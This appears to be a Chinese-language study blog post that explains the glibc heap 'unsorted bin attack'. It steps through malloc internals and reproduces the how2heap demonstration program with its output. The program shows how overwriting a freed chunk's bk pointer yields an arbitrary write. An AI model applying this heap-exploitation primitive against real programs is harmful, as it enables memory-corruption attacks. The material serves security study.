# unsorted bin attack

网上很多关于unsorted bin attack的博客都说，此攻击的关键在于malloc中的这段代码：

```c
 /* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

虽然注释把这两句话的结果（将一个unsorted chunk从unsorted list中移除）写得很清楚，但我完全不清楚它具体干了些什么，更不明白它为什么关键（悲），而各个博客中也没有详细的说明，所以决定进行一步步的梳理。

## malloc state与bins

首先，找到函数头，可以看到av的类型是mstate，即**malloc_state**。其表示一个arena。malloc_state结构的定义：

```c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Set if the fastbin chunks contain recently inserted free blocks.  */
  /* Note this is a bool but not all targets support atomics on booleans.  */
  int have_fastchunks;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2]; /* NBINS宏定义为128 */

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};
```

注意其中的bins数组，它用于保存 unsorted bin、small bins 以及 large bins，共计可容纳 126 个，其中：

- Bin 1: unsorted bin;
- Bin 2 - 63: small bins;
- Bin 64 - 126: large bins.

但代码中bins数组的大小并不是126。这是因为这几种chunk list都是循环双向链表，于是bins数组不以下标n索引第n个bin，而是由$bins[i],bins[i+1] (i=0,2,...)$代表一个bin。bins[i]中存的是fd指针，bins[i+1]中是bk指针。奇怪的是，bins的大小也不是$126*2$，而是$128*2-2$。不过这应该与议题无关，所以就不去深究了。

## malloc_chunk

bins的类型mchunkptr为malloc_chunk*。

malloc_chunk结构体就是用来描述chunk的。

```c
struct malloc_chunk {
INTERNAL_SIZE_T prev_size;
INTERNAL_SIZE_T size;
struct malloc_chunk *fd; /* 下一个free chunk */
struct malloc_chunk *bk; /* 下一个free chunk */
}
```

从上到下为低地址到高地址。chunk为malloc_chunk*指向位置，mem为malloc返回给用户的指针位置。

![Allocated chunk](https://img-blog.csdn.net/20160721185357845)

![Free chunk](https://img-blog.csdn.net/20160721192333308)

## unsorted_chunks()与bin_at()

继续看第一句代码，查看其中unsorted_chunks()的含义：

```c
/* bins的第一个是unsorted bin */
#define unsorted_chunks(M)          (bin_at (M, 1))

/*  mbinptr就是chunk类型的指针 */
typedef struct malloc_chunk *mbinptr;

/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
   (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))                           \
              - offsetof (struct malloc_chunk, fd))
```

unsorted利用到的`bin_at(m, i)`宏看起来有点复杂，但分析后其实很好理解。

前半句`((char *) &((m)->bins[((i) - 1) * 2]))`的意思很显然：返回第i个bin的地址。强制类型转换是为了后半句做减法。

后半句的目的需要查看代码有关bins的注释，其中有一段做了很清除的解释：

```c
/*
...
To simplify use in double-linked lists, each bin header acts
as a malloc_chunk. This avoids special-casing for headers.
But to conserve space and improve locality, we allocate
only the fd/bk pointers of bins, and then use repositioning tricks
to treat these as the fields of a malloc_chunk*.
*/
```

注意到C 库宏 **offsetof(type, member-designator)** 生成一个类型为 **size_t** 的整型常量，它是一个结构成员相对于结构开头的字节偏移量。

结合free_chunk的图示，很显然`- offsetof (struct malloc_chunk, fd)`能产生一个假想的free_chunk。

将unsorted chunks 链表看作队列（**队头**出列**队尾**入列），则此"chunk"的fd指向队尾，bk指向队头。同时，队尾的bk与队头的fd指向此"chunk"。一个循环链表就这么构成了。

同时，这也解释了为什么bin_at返回的指针类型，还有bins的类型都为malloc_chunk*。

## bck

继续查看一开始的代码。

bck为队列尾的bk指向的chunk，即队尾的上一个chunk：

```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
         {
           bck = victim->bk;
           ......
```

于是代码做的事很明了了，移除队尾元素并维护队列（双向循环链表）结构。

```c
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

到此为止，移除unsorted list一个元素的机制已经基本上清楚了。

## 攻击

此时再回头看how2heap中unsorted bin attack 的代码，就一目了然了：

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
		   "rewritten:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

代码给`p[1]`赋值，参照free_chunk示例图，其实是修改p的bk的值。再次`malloc(400)`，将处于队头的p从unsorted list中移除，此时

```c
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

这部分代码就会产生问题：bck是原`((av)->bk)->bk`，它已经被改写为`(unsigned long)(&stack_var-2)`了。为什么是`&stack_var-2`?参考free_chunk示例图可知这样第二句正好等价于`*stack_var_ptr =...`。 这样一来stack_var的值就在p脱链的过程中被改写成了unsorted_chunk(av)。

可以看出unsorted bin attack就是以这种方式改写任意地址上的值，但是改写的值为unsorted_chunk(av)，并不可控。根据how2heap代码中所说，这种攻击一般是为其他攻击做铺垫，比如修改全局变量global_max_fast的值，再进行fast bin attack。

最后附上运行代码的结果：

```
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7ffd7d7d9108: 0

Now, we allocate first normal chunk on the heap at: 0x1487010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f4634097b78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffd7d7d90f8

Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
0x7ffd7d7d9108: 0x7f4634097b78
```



## 参考链接

[malloc源代码](<https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hb=bcdaad21d4635931d1bd3b54a7894276925d081d>) 后来发现此glibc代码版本比实际测试使用的要高，但对本实验没有过多影响。

[理解 glibc malloc：主流用户态内存分配器实现原理](<https://blog.csdn.net/maokelong95/article/details/51989081#51_Fast_Bin_364>)

[linux 堆溢出学习之malloc堆管理机制原理详解](<https://blog.csdn.net/qq_29343201/article/details/59614863>)

